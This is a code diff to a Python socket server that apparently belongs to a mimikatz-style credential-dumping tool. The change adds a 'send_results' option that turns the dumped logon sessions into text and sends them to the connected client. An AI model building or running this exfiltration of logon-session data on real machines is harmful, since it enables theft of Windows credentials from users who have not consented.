@@ -13,10 +13,11 @@ import socket
 logging.basicConfig(level=10)
 
 class ThreadedPYPYSocketServer:
-	def __init__(self, ip, port, resultQ):
+	def __init__(self, ip, port, resultQ, send_results = False):
 		self.listen_ip = ip
 		self.listen_port = port
 		self.resultQ = resultQ
+		self.send_results = send_results
 		
 		self.ssock = None
 		
@@ -52,6 +53,12 @@ class ThreadedPYPYSocketServer:
 			
 			cmd = PYPYCMD()
 			cmd.cmdtype = PYPYCMDType.END
+			if self.send_results == True:
+				data = ""
+				for luid in mimi.logon_sessions:
+					data += str(mimi.logon_sessions[luid])
+			
+				cmd.params.append(data.encode())
 			transport.send(cmd)
 			print('[+] Client finished!')
 			
